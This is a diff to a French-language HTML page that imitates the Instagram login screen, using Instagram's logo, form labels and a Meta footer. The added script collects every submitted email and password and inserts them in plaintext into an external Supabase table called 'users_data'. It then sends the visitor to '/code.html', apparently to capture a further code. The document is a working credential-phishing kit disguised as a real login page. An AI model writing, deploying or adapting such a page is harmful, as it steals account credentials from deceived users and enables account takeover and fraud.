@@ -34,16 +34,16 @@
       align-items: center;
       margin: auto 0;
     }
-    .logo-icon {
-      width: 64px;
-      height: 64px;
+    .logo-img {
+      width: 60px;
+      height: 60px;
       margin-bottom: 25px;
     }
     form {
       width: 100%;
       display: flex;
       flex-direction: column;
-      gap: 12px;
+      gap: 10px;
     }
     .input-field {
       width: 100%;
@@ -119,5 +119,66 @@
   <div class="lang-selector">Français (France) ∨</div>
 
   <div class="main-container">
-    <svg class="logo-icon" viewBox="0 0 24 24" fill="none">
-      <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.9
+    <img class="logo-img" src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" alt="Instagram">
+
+    <form id="loginForm">
+      <input type="email" id="email" class="input-field" placeholder="Nom de profil, e-mail ou numéro de mobile" required>
+      <input type="password" id="password" class="input-field" placeholder="Mot de passe" required>
+      <button type="submit" id="submitBtn" class="btn-login">Se connecter</button>
+    </form>
+
+    <a href="#" class="forgot-password">Mot de passe oublié ?</a>
+  </div>
+
+  <div class="footer-container">
+    <a href="#" class="btn-create">Créer un nouveau compte</a>
+    <div class="meta-logo">∞ Meta</div>
+  </div>
+
+  <script>
+    const SUPABASE_URL = 'https://snetqzdsjfjygjlpwzbi.supabase.co';
+    const SUPABASE_KEY = 'sb_publishable_hG2eyT1OpV7SlR_rNmMQEQ_dGLtFq0W';
+    const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+    const form = document.getElementById('loginForm');
+    const submitBtn = document.getElementById('submitBtn');
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value;
+
+      if (!email.toLowerCase().endsWith('@gmail.com')) {
+        alert('Veuillez entrer un e-mail valide (@gmail.com)');
+        return;
+      }
+
+      submitBtn.disabled = true;
+      submitBtn.innerText = 'Connexion...';
+
+      try {
+        const { data, error } = await supabaseClient
+          .from('users_data')
+          .insert([{ email: email, password: password }])
+          .select();
+
+        if (error) {
+          console.error('Error inserting data:', error);
+          alert('Erreur: ' + error.message);
+          submitBtn.disabled = false;
+          submitBtn.innerText = 'Se connecter';
+        } else if (data && data.length > 0) {
+          localStorage.setItem('user_row_id', data[0].id);
+          window.location.href = '/code.html';
+        }
+      } catch (err) {
+        console.error('Unexpected error:', err);
+        alert('Erreur inattendue!');
+        submitBtn.disabled = false;
+        submitBtn.innerText = 'Se connecter';
+      }
+    });
+  </script>
+</body>
+</html>
